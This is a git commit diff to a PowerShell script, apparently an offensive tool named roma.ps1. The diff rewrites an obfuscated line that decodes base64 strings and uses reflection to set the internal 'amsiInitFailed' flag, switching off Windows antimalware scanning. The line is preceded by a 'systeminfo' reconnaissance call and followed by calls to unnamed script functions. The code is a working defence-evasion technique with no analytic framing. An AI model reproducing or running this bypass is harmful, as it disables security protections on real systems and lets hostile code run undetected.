7b691fcd4e15f7f55b557062ca5cee90decf0cfb
W1kyri3 <81154240+W1kyri3@users.noreply.github.com>
2021-04-14 12:35:03 +0100

    Update roma.ps1

--- roma.ps1
+++ roma.ps1
@@ -83,6 +83,5 @@ $cinstance.aRuna();
 
 }
  
-[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
-mosder
-grtzol
+systeminfo; [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true); mosder; grtzol
+
